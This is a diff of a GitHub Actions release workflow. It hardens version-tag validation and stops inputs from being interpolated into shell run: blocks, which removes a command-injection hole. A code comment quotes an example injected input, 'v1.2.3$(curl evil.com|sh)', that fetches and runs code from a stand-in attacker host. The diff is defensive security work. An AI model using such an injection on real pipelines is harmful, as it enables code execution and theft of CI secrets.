@@ -98,10 +98,25 @@ jobs:
           # every shape the bash regex did (single- or multi-digit
           # version components, optional dash-suffix like `-rc.1`),
           # without the bash dependency.
-          case "${TAG}" in
-            v[0-9]*.[0-9]*.[0-9]*|"v[0-9]*.[0-9]*.[0-9]*-"*) ;;
-            *) echo "ERROR: '${TAG}' is not vX.Y.Z (optionally -suffix)"; exit 1 ;;
-          esac
+          # v2.11.4 (#211): the prior `case` pattern was a loose
+          # shell glob (`v[0-9]*.[0-9]*.[0-9]*`) — it accepted
+          # shell metachars after the version root, so a
+          # workflow_dispatch caller could feed
+          # `version='v1.2.3$(curl evil.com|sh)'` past the
+          # validator. The shell sinks downstream (build meta
+          # step, publish meta step) interpolated the input
+          # directly into `run:` blocks, where GitHub Actions
+          # expands `${{ inputs.version }}` before shell
+          # execution. Tighten with an anchored regex via
+          # `grep -Eq`: accepts the documented version shape
+          # (single- or multi-digit components, optional
+          # dash-suffix like `-rc.1`) and rejects everything
+          # else, including `$`, `(`, `)`, backtick, `;`, `&`,
+          # `|`, and any other shell metacharacter.
+          if ! printf '%s' "${TAG}" | grep -Eq '^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.]+)?$'; then
+            echo "ERROR: '${TAG}' is not vX.Y.Z (optionally -suffix)"
+            exit 1
+          fi
           echo "TAG=${TAG}" >> "$GITHUB_OUTPUT"
 
   # Job 2: tag-reachability guard. Enforces AGENTS.md "tag the
@@ -323,15 +338,16 @@ jobs:
       - name: Resolve tag, version and enabled registries
         id: meta
         env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
           DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
           DOCKERHUB_TOKEN: ${{ secrets.DOCKERHUB_TOKEN }}
           AWS_ROLE_TO_ASSUME: ${{ secrets.AWS_ROLE_TO_ASSUME }}
         run: |
           set -euo pipefail
-          if [ "${{ github.event_name }}" = "workflow_dispatch" ]; then
-            tag="${{ inputs.version }}"
+          if [ "${GITHUB_EVENT_NAME}" = "workflow_dispatch" ]; then
+            tag="${INPUT_VERSION}"
           else
-            tag="${{ github.ref_name }}"
+            tag="${GITHUB_REF_NAME}"
           fi
           version="${tag#v}"
           image="ghcr.io/${{ github.repository_owner }}/ftp-deployment-action"
@@ -653,9 +669,11 @@ jobs:
 
       - name: Extract metadata
         id: meta
+        env:
+          INPUT_VERSION: ${{ github.event.inputs.version }}
         run: |
           set -euo pipefail
-          TAG="${{ github.event.inputs.version || github.ref_name }}"
+          TAG="${INPUT_VERSION:-${GITHUB_REF_NAME}}"
           {
             echo "tag=${TAG}"
             echo "version=${TAG#v}"
